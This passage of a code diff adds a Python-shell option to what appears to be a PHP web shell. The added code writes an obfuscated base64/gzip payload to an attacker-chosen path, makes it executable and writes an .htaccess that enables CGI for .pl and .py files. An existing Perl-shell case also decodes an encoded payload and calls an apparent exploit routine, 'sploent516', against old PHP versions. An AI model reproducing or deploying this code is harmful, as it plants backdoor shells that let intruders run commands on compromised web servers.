nIedDpfttT6p9zNm/H+wc="));
+     $htaccess='Options +Indexes +FollowSymLinks +ExecCGI
+AddType application/x-httpd-cgi .pl .py';
+     if (strnatcmp(version(),"5.2.9") <= 0) {
+      sploent516();
+     }
+     $fh=fopen($_POST["dir"]."/".$_POST["file"],"w");
+     if (!$fh) { echo "can`t fopen ".$_POST["dir"]."/".$_POST["file"]."!"; }
+     else {
+      fwrite($fh,$pyshcode);
+      fclose($fh);
+      echo $_POST["file"]." write done, chmoding..<br>";
+      $ch=chmod($_POST["dir"]."/".$_POST["file"], 0755);
+      if (!$ch) {
+       echo "chmod failed, make chmod 755 manually<br>";
+      } else {
+       echo "chmod done<br>";
+      }
+      if ($_POST["htaccess"] == "on") {
+       $fh=fopen($_POST["dir"]."/.htaccess","w");
+       fwrite($fh,$htaccess);
+       fclose($fh);
+       echo "htaccess done";
+      }
+     }
+     break;
     case "perlsh":
      //author/license unknown, assuming WTFPL 
      if ($failflag=="1") {
@@ -1411,7 +1455,7 @@ switch ($_GET['p']) {
      $perlshcode.="\n";
      $perlshcode.=gzinflate(base64_decode("TVFLTwIxEL73V4wNMSXZFdSYGBY2QQ7E+DioRxKtu7PSpNuubRdQ5L87XYR4m3bme8w3rUeYzW/hcz1IjX3dLEOtYeSDNKV05SBj7X5gNJpJ19CYqGSQ2r/YG2fXHl0/Y41TJsASZYlOpMVSOo8BJjnwNlTpNe8njAhdeI3kItXSfHRd1/IE0qCCxu7NiUtVIKCRTtaiD33YsvoLeiuY/P3xFT8K9lYJ8PG7yxeGZ91cUDXalqThcpgxbQupofd8O99O758edvTt23fYQqEtLXU3fTwwcSCCUiHwPwaewS5jvUaVBLINGkHTpEZOLvLTc/iJLjpAIc0bWTk5IxPQGo3eg4hAGsAV6W+Z1NLV4mDuaL+zPg64oWhQQmG1nyz49XDBISZL9cXVgufkbL1UGgWMyUMeM4GOgCwemQYHmjySEmSvOSSxf8vu2AGxP0dlXZ2wCK0U6lKkRtY4ySljOotX31RTkFTTHi3uL5TEDGsVBJ/beFg0ZUcDVHT3pbU31I7Svw=="));
      $htaccess='Options +Indexes +FollowSymLinks +ExecCGI
-AddType application/x-httpd-cgi .pl';
+AddType application/x-httpd-cgi .pl .py';
      if (strnatcmp(version(),"5.2.9") <= 0) { 
       sploent516();
      }
